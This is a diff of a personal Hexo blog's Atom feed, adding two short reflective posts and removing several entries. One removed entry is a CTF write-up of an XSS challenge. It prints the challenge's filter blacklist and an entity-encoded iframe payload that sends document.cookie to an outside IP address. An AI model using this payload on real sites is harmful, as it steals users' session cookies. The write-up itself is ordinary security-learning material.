@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lxzmads.github.io/"/>
-  <updated>2019-08-20T02:26:05.869Z</updated>
+  <updated>2019-08-30T09:18:35.256Z</updated>
   <id>http://lxzmads.github.io/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>自己的一些学习做题笔记以及思考</title>
+    <link href="http://lxzmads.github.io/2099/08/30/%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%80%9D%E8%80%83/"/>
+    <id>http://lxzmads.github.io/2099/08/30/自己的一些学习做题笔记以及思考/</id>
+    <published>2099-08-30T09:17:04.000Z</published>
+    <updated>2019-08-30T09:18:35.256Z</updated>
+    
+    <content type="html"><![CDATA[<p>希望分享以此帮助到人，结识到人，温暖到人。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;希望分享以此帮助到人，结识到人，温暖到人。&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>关于学习新概念与创新</title>
+    <link href="http://lxzmads.github.io/2019/08/30/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E6%96%B0%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%9B%E6%96%B0/"/>
+    <id>http://lxzmads.github.io/2019/08/30/关于学习新概念与创新/</id>
+    <published>2019-08-30T09:14:03.000Z</published>
+    <updated>2019-08-30T09:18:39.528Z</updated>
+    
+    <content type="html"><![CDATA[<p>#</p><p>似乎有一种感觉，所有的事物都和正负电子一样，是成双成对的出现的。对于一种事物，它给我带来了好处，似乎也存在着一种隐藏的负面效果。今天我在静下心来想认真思考一下我想要理解的事物时，尤其感觉到了这点。这些事物在我脑子里似乎形成了一些印象，就像古时候的印刷版，想要刻的字都印在了板子上面，也就是这些根深蒂固的印象，让我理解基于它之上的一些事物时变得更加轻松，解决基于它的问题变得更加迅速，这些是好处。然而就是今天我在思考诸如此类的已经在脑中形成有利于我理解与解决的事物时，我发现异常的困难。它是那样的根深蒂固，让我很难去在它的基础层面撼动它。每每想去思考它的本质，想加以创新，都变得比一般生疏的概念要更加困难。这些固有的概念，是创新的重灾区。而这种好处与坏处的均衡，真是像极了正负电子。只是有一方“被”发生了背叛，才让我意识到它们的存在。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#&lt;/p&gt;
+&lt;p&gt;似乎有一种感觉，所有的事物都和正负电子一样，是成双成对的出现的。对于一种事物，它给我带来了好处，似乎也存在着一种隐藏的负面效果。今天我在静下心来想认真思考一下我想要理解的事物时，尤其感觉到了这点。这些事物在我脑子里似乎形成了一些印象，就像古时候的印刷版，想
+      
+    
+    </summary>
+    
+    
+      <category term="乱想" scheme="http://lxzmads.github.io/tags/%E4%B9%B1%E6%83%B3/"/>
+    
+  </entry>
   
   <entry>
     <title>记SUCTF2019一道简单的sqli</title>
@@ -41,32 +87,6 @@
   </entry>
   
   <entry>
-    <title>Chromium’s Text Autosizer 排坑</title>
-    <link href="http://lxzmads.github.io/2019/08/02/Chromium%E2%80%99s-Text-Autosizer-%E6%8E%92%E5%9D%91/"/>
-    <id>http://lxzmads.github.io/2019/08/02/Chromium’s-Text-Autosizer-排坑/</id>
-    <published>2019-08-02T11:50:31.000Z</published>
-    <updated>2019-08-12T07:22:17.386Z</updated>
-    
-    <content type="html"><![CDATA[<p>闲来无事，想把丑陋的博客“整下容”。本来轻松愉快的改CSS，改的逍遥自在啊，直到发生了这件事。。。不想听我讲故事的直接到<a href="#总结">总结</a>即可。</p><h1 id="咦，难道我写bug了？"><a href="#咦，难道我写bug了？" class="headerlink" title="咦，难道我写bug了？"></a>咦，难道我写bug了？</h1><p>二零一九年八月二日的一个炎热的午后，辛苦了改了一天的我正准备调整一下最后的手机上的响应式布局相关的CSS代码。当我满心欢喜的改完之后打开我的Safari预览时，咦？怎么这两块的字体怎么一大一小？大概是下面这个样子：</p><p><img width="218" height="400" src="https://raw.githubusercontent.com/lxzmads/picbed/master/D377F564EED3F0D2C3C6D525E9726570.png"></p><p>这两个地方都是显示代码块的地方，为什么一个那么大，一个却正常？我当时眉头一紧，觉得可能CSS写的有问题。然而转念一想（其实调了好久，大约两个小时，最后还动用了一个远程调试的tool），不对呀。CSS针对的也不是位置啊，而是对标签的样式行为进行定义，然而这两块按理说都是一样的标签，从而也就是一样的CSS了。</p><h1 id="折磨"><a href="#折磨" class="headerlink" title="折磨"></a>折磨</h1><p>在苦苦思考不得而知的时候，我开始想起了求助某个全栈大佬，心想他写CSS比我熟练，可能知道些什么。然鹅经过一番QQ交谈，最终以“玄学”、“神奇”等词汇告终。然而此番交谈我得到了以下信息：</p><ul><li>在大佬的安卓机子上的浏览器（可能是firefox或者自带的）和QQ里面的浏览器打开，显示是正常的。</li><li>大佬也帮我检查了一下CSS，确实是没有问题的。</li><li>我随口分析时说，这两个地方除了内容，真的没什么不一样了（除了时空理论别和我杠=w=）。</li></ul><h1 id="拨云见雾"><a href="#拨云见雾" class="headerlink" title="拨云见雾"></a>拨云见雾</h1><p>于是，利用仅有的这些信息，我开始疯狂在浏览器里面fuzz。关键词组合太多这里就不列举了。最终利用如下关键词搜到了有用信息：</p><ul><li>css 字体变大（别笑！）</li></ul><p>全英文检索还真搜不到什么hhh。</p><p>搜到的是CSDN一位小哥一年前的记录，链接在<a href="https://blog.csdn.net/weixin_42034412/article/details/80462099" target="_blank" rel="noopener">这里</a>，通过他的博客我继续检索关键字<code>Text Autosizer</code>找到了以下有用的信息。</p><ul><li><a href="https://github.com/ccchangkong/article/issues/20" target="_blank" rel="noopener">Github一位小哥的分析</a></li><li><a href="https://docs.google.com/document/d/1PPcEwAhXJJ1TQShor29KWB17KJJq7UJOM34oHwYP3Zg/edit#heading=h.si6prvoucj2z" target="_blank" rel="noopener">官方文档</a></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>于是总结一下就是：</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在做webkit内核的移动端页面的时候，会发现某些字体会自动放大，放大的比例以及放大的时机看上去还没啥规律，很是诡异。</p><h2 id="原因及解决方案"><a href="#原因及解决方案" class="headerlink" title="原因及解决方案"></a>原因及解决方案</h2><ul><li>原因</li></ul><p>不是bug，是Chromium内核提高移动端文本可读性的一个特性，叫做这个特性被称做「Text Autosizer」，又称「Font Boosting」、「Font Inflation」</p><ul><li>解决</li></ul><ol><li>限定元素宽高</li><li>设置<code>-webkit-text-size-adjust: none;</code></li></ol><p>最后借用下老哥的图。</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f36633762666231326777316638743067693064686f6a3230647230676f6a736f2e6a7067.jpeg" alt="687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f36633762666231326777316638743067693064686f6a3230647230676f6a736f2e6a7067.jpeg"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;闲来无事，想把丑陋的博客“整下容”。本来轻松愉快的改CSS，改的逍遥自在啊，直到发生了这件事。。。不想听我讲故事的直接到&lt;a href=&quot;#总结&quot;&gt;总结&lt;/a&gt;即可。&lt;/p&gt;
-&lt;h1 id=&quot;咦，难道我写bug了？&quot;&gt;&lt;a href=&quot;#咦，难道我写bug了？&quot; class
-      
-    
-    </summary>
-    
-    
-      <category term="排坑" scheme="http://lxzmads.github.io/tags/%E6%8E%92%E5%9D%91/"/>
-    
-      <category term="前端" scheme="http://lxzmads.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
-    
-  </entry>
-  
-  <entry>
     <title>通过CISCN2019一道SQL注入思考基于运行时错误的盲注</title>
     <link href="http://lxzmads.github.io/2019/04/23/%E9%80%9A%E8%BF%87CISCN2019%E4%B8%80%E9%81%93SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%80%83%E5%9F%BA%E4%BA%8E%E8%BF%90%E8%A1%8C%E6%97%B6%E9%94%99%E8%AF%AF%E7%9A%84%E7%9B%B2%E6%B3%A8/"/>
     <id>http://lxzmads.github.io/2019/04/23/通过CISCN2019一道SQL注入思考基于运行时错误的盲注/</id>
@@ -87,32 +107,6 @@
     
     
       <category term="SQL" scheme="http://lxzmads.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>西湖论剑2019一道XSS记录</title>
-    <link href="http://lxzmads.github.io/2019/04/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019%E4%B8%80%E9%81%93XSS%E8%AE%B0%E5%BD%95/"/>
-    <id>http://lxzmads.github.io/2019/04/11/西湖论剑2019一道XSS记录/</id>
-    <published>2019-04-11T08:36:46.000Z</published>
-    <updated>2019-04-11T13:04:03.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>通过复现这道题，觉得这么简单的题怎么当时没做出来，感觉自己状态是不对的。其实赛前觉得自己挺有信心的，现在看来应该是属于信心过头，变得有点傲慢了。而且比赛过程中并没有很坚持的去做题，总结一个字，”菜“。 记录这篇复现当作反思，常温习常警醒。</p><p>希望自己以后遇到问题能够 <code>Try it harder and harder and harder...</code></p><h1 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h1><p>说实话这名字让我以为要绕同源策略，结果发现根本就不用。拿到shell之后发现题目的waf真的很简单，就是下面这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $black_list = <span class="string">"script|\W+on.*?="</span>;</span><br><span class="line">    $str = preg_replace(<span class="string">"/"</span>.$black_list.<span class="string">"/i"</span>,<span class="string">":)"</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是只要利用简单的编码就可以绕过了， 一个可行的payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#50;&amp;#51;&amp;#46;&amp;#50;&amp;#48;&amp;#54;&amp;#46;&amp;#49;&amp;#54;&amp;#53;&amp;#46;&amp;#49;&amp;#54;&amp;#53;&amp;#47;&amp;#63;&amp;#99;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>比赛时候说实话很久没做web，测试了一下<code>&lt;img&gt;</code>的src不能work之后就没测试<code>&lt;iframe&gt;</code>的了。然后一直想直接csrf让bot来直接执行命令，但是一直没打通。我的做法是在iframe里面构造一个表单然后提交，表单就是直接执行exec.php的，因为表单是不受同源策略限制的，在<code>iframe</code>里面虽然origin是null，但是是可以发起请求的。后来我猜想是bot的问题。</p><p>这道题的bot用的是chromedriver来解析我们的页面的，版本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ChromeDriver 2.42.591071 (0b695ff80972cc1a65a5cd643186d2ae582cd4ac)</span><br></pre></td></tr></table></figure><p>我下载了这个版本的driver本地测试了一下。测试了很久，还是没找到原因，感觉是他的bot加了什么参数导致iframe里面的表单无法被提交，有知道的师傅麻烦告诉我一下。。。</p><p>终于找到原因了，原来是他的bot挂了hhhh，坑啊，虽然加上300分也没什么用，无所谓啦。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;通过复现这道题，觉得这么简单的题怎么当时没做出来，感觉自己状态是不对的。其实赛前觉得自己挺有信心的，现在看来应该是属于信心过头，变得有点傲慢了。而且比赛过程中并没有很坚持的去做题，总结一个字，”菜“。 记录这篇复现当作反思，常温习常警醒。&lt;/p&gt;
-&lt;p&gt;希望自己以后遇到问题
-      
-    
-    </summary>
-    
-    
-      <category term="Web安全" scheme="http://lxzmads.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="XSS" scheme="http://lxzmads.github.io/tags/XSS/"/>
     
   </entry>
   
@@ -557,29 +551,6 @@
     
     
       <category term="RSA" scheme="http://lxzmads.github.io/tags/RSA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>给Hexo主题加上TOC</title>
-    <link href="http://lxzmads.github.io/2018/09/02/%E7%BB%99Hexo%E4%B8%BB%E9%A2%98%E5%8A%A0%E4%B8%8ATOC/"/>
-    <id>http://lxzmads.github.io/2018/09/02/给Hexo主题加上TOC/</id>
-    <published>2018-09-01T16:00:00.000Z</published>
-    <updated>2019-02-17T08:05:38.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>博客从大一就搭了，方案从github pages+hexo换到WordPress再到现在hexo+vultr，但博客却一直没有时间写。当初搭博客时候就是为了分享点自己的一些想法，希望能够在网上结识到志同道合的人。然而现实的情况却是忙的不可开交，从大二下开始准备保研之后，几乎所有涉及到保研的事项一个都不敢懈怠，除了课程考试外，还有课程设计、各种比赛以及一些项目。当然只做到热爱学习可不行，还要保证身体吃得消，因为体育课也不能挂科啊T.T。可能是理所当然，但一定是雪上加霜的是因为太过忙碌的原因在大二下期末考试周时候生了一场很严重的感冒，从那之后很多年没犯的鼻炎又复发，到现在都还没怎么痊愈。说实话这非常影响我的正常学习生活，两个夏天，晚上睡觉时候空调都不敢彻夜开着，因为第二天起来会受不了，对此我非常感谢宽宏大量的舍友的不杀之恩。这么拼，还不是因为大一的成绩实在太差，如果不抓住最后的尾巴那么保研无望。幸运的是靠着身边人的帮助以及自己的努力，最终还是抓住了保研的尾巴。我非常感恩在XMU遇到的每个人，我非常喜欢XMU，XMU的景色、XMU的食堂以及XMU的人我不会忘记。然而我还年轻，我想去960万平方公里的其他地方看看。</p><p>QAQ说了这么多，绝不是就是想找一个拖了三年没写博客的借口。有一句话说的好，“写博客最好的时间有两个，一个是十年前，另一个就是现在”，所以趁着大四的时间，我可以用现在好好理一理自己的过去，畅想自己的未来，并用博客将这些记录下来。</p><p>那就从现在开始吧！</p><h1 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h1><p>从<a href="https://hexo.io/themes/" target="_blank" rel="noopener">Hexo官网</a>选择了一款看起来很简洁的主题PolarBear。从一开始喜欢花里胡哨再到喜欢扁平化的天蓝色风格，最终选择白底黑字的风格，这就像我心境的变化吧。(你不要想我是为了节约流量)但是唯一不满意的地方就是这个主题的文章右边没有TOC目录，这让我这种非常注重用户体验的程序员非常不满。想了想Hexo主题都是开源的，应该可以改一改吧~</p><h1 id="动手"><a href="#动手" class="headerlink" title="动手"></a>动手</h1><h2 id="RTFM"><a href="#RTFM" class="headerlink" title="RTFM"></a>RTFM</h2><p>从以往hack的经验看，与其去Google搜索各种解决方案，然后一个个实验那些早已被版本抛弃的方法来浪费时间，还不如去RTFM。于是打开<a href="https://hexo.io/zh-cn/docs" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs</a>，搜索<code>TOC</code>，在辅助函数看到一个可以自动生成TOC目录的辅助函数<code>toc(str, [options])</code>。所以现在想法就很简单了，直接在Hexo主题的post模板文件中添加一个node，然后设置适当的css就可以啦~</p><h2 id="审计主题源代码"><a href="#审计主题源代码" class="headerlink" title="审计主题源代码"></a>审计主题源代码</h2><p>寻找了一番，在<code>polarbear/layout/</code>目录下发现了主题的各种模板文件，都是<code>swig</code>模板引擎写的，语法也不复杂，浏览了几个文件大概就知道语法规则了。发现了<code>post.swig</code>文件，先打开看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;_layout.swig&quot; %&#125;</span><br><span class="line">&#123;% import &apos;_macro/post.swig&apos; as post_template %&#125;</span><br><span class="line">&#123;% block title %&#125; &#123;&#123; page.title &#125;&#125; - &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;primary&quot;&gt;</span><br><span class="line">        &#123;&#123; post_template.render(page) &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>可以发现导入了<code>_macro/post.swig</code>文件，从<code>render()</code>函数猜想这个文件应该是一个post的模板，大概就是从<code>page</code>和<code>config</code>来获取页面标题并显示，至于<code>page</code>和<code>config</code>是什么其实我并不关心，我猜想就是个类似于全局变量的东西，然后从名字就可以猜出有什么作用了。之后就是构造一些div结点来组织页面内容，利用导入的<code>post_template</code>来渲染页面内容。我们还可以发现<code>swig</code>中内容都是用<code> {% block * %} * {% endblock %} </code>的方式申明的，并且可以在<code>{{ }}</code>中写js语句。学习了一波<code>swig</code>语法~</p><p>所以比较关键的就是<code>_macro/post.swig</code>文件，我们跟进去看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro render(post) %&#125;</span><br><span class="line">  &lt;article class=&quot;post&quot;&gt;</span><br><span class="line">    &lt;header class=&quot;post-header&quot;&gt;</span><br><span class="line">      &lt;h1 class=&quot;post-title&quot;&gt;</span><br><span class="line">        &#123;% if is_home() %&#125;</span><br><span class="line">          &lt;a class=&quot;post-link&quot; href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;&gt;&#123;&#123; post.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">          &#123;&#123; post.title &#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">      &lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">      &lt;time class=&quot;post-time&quot;&gt;</span><br><span class="line">          &#123;&#123; full_date(post.date, &apos;MMM DD YYYY&apos;) &#125;&#125;</span><br><span class="line">      &lt;/time&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">    &#123;% if is_home() %&#125;</span><br><span class="line">        &lt;div class=&quot;post-excerpt&quot;&gt;</span><br><span class="line">            &#123;% set excerpt = &quot;&quot; %&#125;</span><br><span class="line">            &#123;% if post.description %&#125;</span><br><span class="line">              &#123;% set excerpt = post.description %&#125;</span><br><span class="line">            &#123;% elif post.excerpt %&#125;</span><br><span class="line">              &#123;% set excerpt = post.excerpt %&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">            &#123;% if excerpt %&#125;</span><br><span class="line">              &#123;&#123; excerpt &#125;&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">          &#123;% else %&#125;</span><br><span class="line">            &lt;div class=&quot;post-content&quot;&gt;</span><br><span class="line">            &#123;&#123; post.content &#125;&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% if not is_home() %&#125;</span><br><span class="line">      &lt;footer class=&quot;post-footer&quot;&gt;</span><br><span class="line">                &#123;% if post.tags and post.tags.length %&#125;</span><br><span class="line">                &lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">                  &#123;% for tag in post.tags %&#125;</span><br><span class="line">                        &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot;&gt;&#123;&#123; tag.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">                  &#123;% endfor %&#125;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">        &#123;# Post Pagination #&#125;</span><br><span class="line">        &#123;% include &quot;../_partial/pagination.swig&quot; %&#125;</span><br><span class="line">        &#123;% include &quot;../_partial/comments.swig&quot; %&#125;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &lt;/article&gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure><p>可以看出这果然就是个渲染post的模板，其中<code>{% if not is_home() %}</code>值得我们注意，大概分析下就是主页的<code>post</code>目录和<code>post</code>的具体内容的渲染都是通过这个模板文件渲染的，然后通过这个if语句来识别不同的上下文。大概渲染逻辑搞明白了，按照之前的思路，我们还需要寻找css文件的位置。在主题的source目录发现<code>_layout.scss</code>，使用<code>scss</code>写的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#content</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="variable">$global-content-margin</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">90%</span>;</span><br><span class="line">        <span class="attribute">max-width</span>: <span class="variable">$global-body-width</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#primary</span><span class="selector-class">.home</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">73%</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#primary</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">850px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="variable">$global-content-margin</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">include</span> max-screen() &#123;</span><br><span class="line">  <span class="selector-class">.site-header-inner</span>, <span class="selector-class">.content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">90%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#secondary</span> &#123;</span><br><span class="line">      <span class="attribute">display</span>: none;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#primary</span><span class="selector-class">.home</span> &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到id为<code>primary</code>的大容器的css样式定义在这里，接下来就可以动手了！</p><h2 id="修改主题源码"><a href="#修改主题源码" class="headerlink" title="修改主题源码"></a>修改主题源码</h2><h3 id="增加TOC"><a href="#增加TOC" class="headerlink" title="增加TOC"></a>增加TOC</h3><p>我觉得TOC目录应该也是属于post的内容的一部分，于是就在<code>layout/_macro/post.swig</code>文件尾部添加了toc函数，这里注意官网给的是<code>ejs</code>的语法样例，我们要按照<code>swig</code>的语法来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;% if not is_home() and toc(page.content, &#123;class: &apos;post-test&apos;&#125;) !== &apos;&apos; %&#125;</span><br><span class="line">    &#123;% block toc %&#125;</span><br><span class="line">        &lt;div class=&quot;toc-container&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;toc-article&quot;&gt;</span><br><span class="line">                &#123;&#123; toc(page.content, &#123;</span><br><span class="line">                    class: &apos;post-poc&apos;,</span><br><span class="line">                    list_number: false</span><br><span class="line">                &#125;)&#125;&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="调整TOC样式"><a href="#调整TOC样式" class="headerlink" title="调整TOC样式"></a>调整TOC样式</h3><p>添加完toc目录还不够，我们还需要修改css来调整toc的位置。<br>因为主题原本的主页和post页面都是包含在id为<code>primary</code>的大容器里面，通过<code>class=&quot;home&quot;</code>来调整主页不同的样式。我们模仿一下，在post的容器增加一个<code>class=&quot;post-container&quot;</code>来方便调整toc的样式。修改<code>layout/post.swig</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;_layout.swig&quot; %&#125;</span><br><span class="line">&#123;% import &apos;_macro/post.swig&apos; as post_template %&#125;</span><br><span class="line">&#123;% block title %&#125; &#123;&#123; page.title &#125;&#125; - &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;primary&quot; class=&quot;post-container&quot;&gt;</span><br><span class="line">        &#123;&#123; post_template.render(page) &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>再调整toc的位置，在<code>source/css/_layout.scss</code>中添加如下代码</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#primary</span><span class="selector-class">.post-container</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">73%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再调整<code>toc</code>本身的样式，在<code>source/css/_partial/_post.scss</code>中添加如下</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.toc-container</span> <span class="selector-class">.toc-article</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f6f6f6</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">overflow-x</span>: auto;</span><br><span class="line">  <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span 